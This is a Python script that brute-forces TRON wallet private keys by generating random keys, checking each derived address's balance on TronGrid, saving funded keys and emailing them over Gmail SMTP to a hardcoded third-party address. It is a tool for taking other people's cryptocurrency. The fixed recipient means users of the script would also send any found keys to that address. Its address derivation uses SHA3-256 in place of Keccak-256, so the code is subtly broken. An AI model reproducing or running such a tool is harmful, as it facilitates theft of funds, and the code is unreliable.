import os
import hashlib
import base58
import ecdsa
import requests
import json
import time
import datetime
import smtplib
from email.mime.text import MIMEText
from tqdm import tqdm

TRONGRID_API = "https://api.trongrid.io"
SCANNED_KEYS_FILE = "scanned_keys.txt"
FUNDED_KEYS_FILE = "funded_keys.txt"
EMAIL_ADDRESS = "youngdollars255@gmail.com"
SMTP_USERNAME = "your-sender-email@gmail.com"    # Replace with your sender email
SMTP_PASSWORD = "your-app-password"               # Replace with your app password

def load_scanned_keys():
    if not os.path.exists(SCANNED_KEYS_FILE):
        return set()
    with open(SCANNED_KEYS_FILE, "r") as f:
        return set(line.strip() for line in f)

def save_scanned_key(private_key):
    with open(SCANNED_KEYS_FILE, "a") as f:
        f.write(f"{private_key}\n")

def save_funded_key(private_key, address, balance):
    with open(FUNDED_KEYS_FILE, "a") as f:
        f.write(f"{address},{private_key},{balance:.6f} TRX\n")

def generate_private_key():
    return os.urandom(32).hex()

def private_key_to_public_key(private_key_hex):
    private_key_bytes = bytes.fromhex(private_key_hex)
    sk = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1)
    vk = sk.get_verifying_key()
    return b'\x04' + vk.to_string()

def public_key_to_tron_address(public_key_bytes):
    keccak256_hash = hashlib.new('sha3_256', public_key_bytes[1:]).digest()
    address_bytes = keccak256_hash[-20:]
    tron_prefixed_address = b'\x41' + address_bytes
    checksum = hashlib.sha256(hashlib.sha256(tron_prefixed_address).digest()).digest()[:4]
    return base58.b58encode(tron_prefixed_address + checksum).decode()

def check_tron_balance(address):
    url = f"{TRONGRID_API}/v1/accounts/{address}"
    while True:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data['data']:
                    balance = data['data'][0].get('balance', 0)
                    return balance / 1_000_000
                return 0
            elif response.status_code == 429:
                sleep_until_tomorrow()
            else:
                print(f"⚠️ Error {response.status_code}, retrying...")
        except requests.RequestException:
            wait_for_internet()

def sleep_until_tomorrow():
    now = datetime.datetime.now()
    next_day = now + datetime.timedelta(days=1)
    next_midnight = datetime.datetime(next_day.year, next_day.month, next_day.day, 0, 0, 0)
    seconds = (next_midnight - now).total_seconds()
    time.sleep(seconds)

def wait_for_internet():
    while True:
        try:
            requests.get("https://google.com", timeout=5)
            return
        except requests.ConnectionError:
            time.sleep(10)

def send_email_notification(address, private_key, balance):
    subject = "🚨 FUNDED TRON Address Found!"
    body = f"""
Funded TRON Address Found!

Address: {address}
Private Key: {private_key}
Balance: {balance:.6f} TRX
"""
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = SMTP_USERNAME
    msg["To"] = EMAIL_ADDRESS
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        server.sendmail(SMTP_USERNAME, EMAIL_ADDRESS, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"⚠️ Email failed: {e}")

def main():
    scanned_keys = load_scanned_keys()
    total_scanned = len(scanned_keys)

    print(f"▶️ Resuming with {total_scanned} scanned keys.")
    progress = tqdm(total=1_000_000, initial=total_scanned, unit="keys")

    while True:
        private_key = generate_private_key()
        if private_key in scanned_keys:
            continue

        public_key = private_key_to_public_key(private_key)
        tron_address = public_key_to_tron_address(public_key)

        balance = check_tron_balance(tron_address)

        if balance > 0:
            save_funded_key(private_key, tron_address, balance)
            send_email_notification(tron_address, private_key, balance)

        save_scanned_key(private_key)
        scanned_keys.add(private_key)
        progress.update(1)

if __name__ == "__main__":
    main()
